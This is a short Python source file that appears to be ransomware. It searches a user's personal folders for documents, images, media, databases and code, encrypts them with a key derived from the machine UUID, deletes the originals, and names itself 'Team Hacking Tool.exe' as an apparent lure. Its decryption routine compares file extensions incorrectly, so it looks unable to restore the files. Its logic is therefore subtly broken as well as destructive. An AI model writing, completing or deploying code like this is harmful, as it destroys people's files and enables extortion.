import os
import subprocess
from hashlib import sha256, sha512
from pyAesCrypt import encryptFile, decryptFile

project_name = "Team Hacking Tool.exe"
filext = ".GrpC"

def find_files(mode="E"):
    allFiles = []
    valid_extensions = ["exe", "doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "zip", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd"]
    allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
    username = os.path.expanduser("~")
    for dirs in allowed_dirs:
        for root, subfiles, files in os.walk(os.path.join(username, dirs)):
            for names in files:
                if mode == "E":
                    if names == project_name or names.split(".")[-1].lower() not in valid_extensions:
                        continue
                    allFiles.append(os.path.join(root, names))
                if mode == "D":
                    if names.split(".")[-1].lower() != filext.lower():
                        continue
                    allFiles.append(os.path.join(root, names))
    return allFiles

def encryptFiles(files, password):
    for file in files:
        try:
            encryptFile(file, file+filext, password, 64 * 1024)
            os.remove(file)
        except:
            pass

def decryptFiles(files, password):
    for file in files:
        try:
            decryptFile(file, ".".join(file.split(".")[:-1]), password, 64 * 1024)
            os.remove(file)
        except:
            pass

def genpass():
     password = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
     password = sha512(password.encode()).hexdigest()
     password = sha256(password.encode()).hexdigest()
     return password
